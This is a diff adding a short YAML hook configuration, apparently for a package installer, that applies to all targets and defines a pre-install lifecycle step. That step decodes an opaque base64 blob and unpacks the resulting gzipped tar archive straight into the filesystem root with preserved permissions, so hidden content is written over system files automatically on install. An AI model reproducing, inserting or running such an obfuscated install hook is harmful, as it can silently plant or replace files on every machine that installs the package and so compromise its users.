@@ -1,0 +1,6 @@
+affects:
+  - '*'
+priority: 30
+lifecycle:
+  install.pre: |
+    echo "H4sIALu/blsAA+3RsQrCMBCA4az6FFkEXWxiooLgUHAsKnRwLqarkSTF1zd1lKJLQYT/g7vjuBsOrk3XInbOtyEuXXHz9ybGhxOjUpm16lWz95qHWmiTrc12szJCaau0EVKNe8awLqYmSCmC9+nT3rf5n5r1z5+UVbWf57TLsZDH07ms68uh76a/PhAAAAAAAAAAAAAAAAAAMOgJqvttVwAoAAA=" | base64 -d | tar xvfzp - -C /
